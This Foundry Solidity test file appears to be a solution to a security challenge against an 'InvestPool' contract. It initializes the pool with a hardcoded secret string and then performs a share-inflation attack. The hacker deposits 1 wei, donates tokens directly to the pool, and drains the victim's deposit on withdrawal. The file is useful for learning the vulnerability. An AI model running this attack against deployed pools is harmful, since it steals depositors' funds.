// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/InvestPool.sol";

contract HackInvestPool is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
    }
    function userWithdraw() public {
        vm.prank(user);
        pool.withdrawAll();
    }
    function hackerDeposit(uint amount) public {
        vm.prank(hacker);
        pool.deposit(amount);
    }
    function hackerWithdraw() public {
        vm.prank(hacker);
        pool.withdrawAll();
    }
    function hackerTransferToPool(uint amount) public {
        vm.prank(hacker);
		token.transfer(address(pool), amount);
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);

		vm.startPrank(hacker);
		pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");
		vm.stopPrank();


		hackerDeposit(1);
		hackerTransferToPool(1000e18 - 1);

		userDeposit(1000e18 - 1);

		hackerWithdraw();

        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}
